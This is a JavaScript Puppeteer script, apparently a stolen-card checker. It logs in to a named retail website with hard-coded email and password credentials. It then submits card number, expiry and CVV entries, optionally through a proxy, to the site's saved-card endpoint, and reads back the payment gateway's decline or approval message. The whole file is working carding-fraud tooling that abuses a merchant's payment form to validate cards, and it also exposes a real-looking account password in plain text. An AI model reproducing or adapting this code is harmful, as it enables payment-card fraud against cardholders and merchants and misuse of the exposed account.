// b3-auth.js (Final Clean Version)
// Returns ONLY the gateway message (e.g. "Card Issuer Declined CVV")

import puppeteer from "puppeteer";

const LOGIN_EMAIL = "veronique12lacroix@gmail.com";
const LOGIN_PASSWORD = "Hawkeye1121.";

async function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

async function waitAndClick(page, selector) {
  try {
    await page.waitForSelector(selector, { visible: true, timeout: 10000 });
    await page.click(selector, { delay: 50 });
    return true;
  } catch {
    return false;
  }
}

async function safeLogin(page) {
  const selectors = [
    'button[type="submit"]',
    'button[title="Login"]',
    'button[title="Sign In"]',
    "button.action.login.primary",
  ];

  await page.waitForSelector('input[name="login[username]"]', { visible: true });
  await page.type('input[name="login[username]"]', LOGIN_EMAIL, { delay: 30 });
  await page.type('input[name="login[password]"]', LOGIN_PASSWORD, {
    delay: 30,
  });

  for (const sel of selectors) {
    if (await waitAndClick(page, sel)) {
      await page
        .waitForNavigation({ waitUntil: "domcontentloaded", timeout: 20000 })
        .catch(() => {});
      return true;
    }
  }

  // Fallback submit
  await page.evaluate(() => {
    const form = document.querySelector('form[action*="login"]');
    if (form) form.submit();
  });

  await page
    .waitForNavigation({ waitUntil: "domcontentloaded", timeout: 20000 })
    .catch(() => {});
  
  return true;
}

export async function runCheck(cardInput, proxyArg = null) {
  const [cc, mm, yyyy, cvv] = cardInput.split(/[|:]/).map((s) => s.trim());
  if (!cc || !mm || !yyyy || !cvv) {
    return "Invalid input. Use: CARD|MM|YYYY|CVV";
  }

  const base = "https://www.royaltyfreefitnessmusic.com";
  const loginUrl = `${base}/customer/account/login/`;
  const vaultUrl = `${base}/vault/cards/listaction/`;
  const postUrl = `${base}/vault/cards/add/`;

  const args = ["--no-sandbox", "--disable-setuid-sandbox"];
  if (proxyArg) args.push(`--proxy-server=${proxyArg}`);

  const browser = await puppeteer.launch({ headless: true, args });
  const page = await browser.newPage();

  let interceptedMessage = null;

  // Block heavy resources for speed
  await page.setRequestInterception(true);
  page.on("request", (req) => {
    const type = req.resourceType();
    if (["image", "stylesheet", "font", "media"].includes(type)) req.abort();
    else req.continue();
  });

  page.setUserAgent(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  );

  // Capture mage-messages cookie
  page.on("response", async (response) => {
    const headers = response.headers();
    if (headers["set-cookie"]?.includes("mage-messages")) {
      const cookies = headers["set-cookie"].split(/,(?=[^;]+?=)/g);
      for (const ck of cookies) {
        if (ck.includes("mage-messages")) interceptedMessage = ck;
      }
    }
  });

  try {
    // Login
    await page.goto(loginUrl, { waitUntil: "domcontentloaded" });
    await safeLogin(page);

    // Load vault page
    await page.goto(vaultUrl, { waitUntil: "domcontentloaded" });

    // Extract form key
    const formKey = await page.evaluate(() => {
      const el = document.querySelector('input[name="form_key"]');
      return el ? el.value : null;
    });

    if (!formKey) {
      await browser.close();
      return "form_key not found";
    }

    // Submit card
    await page.evaluate(
      async ({ postUrl, cc, mm, yyyy, cvv, formKey }) => {
        function encode(obj) {
          return Object.entries(obj)
            .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
            .join("&");
        }

        const payload = {
          form_key: formKey,
          "payment[cc_number]": cc,
          "payment[cc_exp_month]": mm,
          "payment[cc_exp_year]": yyyy,
          "payment[cc_cid]": cvv,
        };

        await fetch(postUrl, {
          method: "POST",
          credentials: "same-origin",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: encode(payload),
        });
      },
      { postUrl, cc, mm, yyyy, cvv, formKey }
    );

    await delay(1000);

    let message = "Unknown result";

    if (interceptedMessage) {
      try {
        const raw = interceptedMessage.split("mage-messages=")[1].split(";")[0];
        let dec = decodeURIComponent(raw);
        dec = decodeURIComponent(dec);

        const parsed = JSON.parse(dec);
        if (Array.isArray(parsed) && parsed[0]?.text) {
          message = parsed[0].text;
        } else {
          message = dec;
        }
      } catch {
        message = interceptedMessage;
      }
    }

    await browser.close();
    return message; // ONLY message text
  } catch (err) {
    await browser.close();
    return err.message; // ONLY error message
  }
}
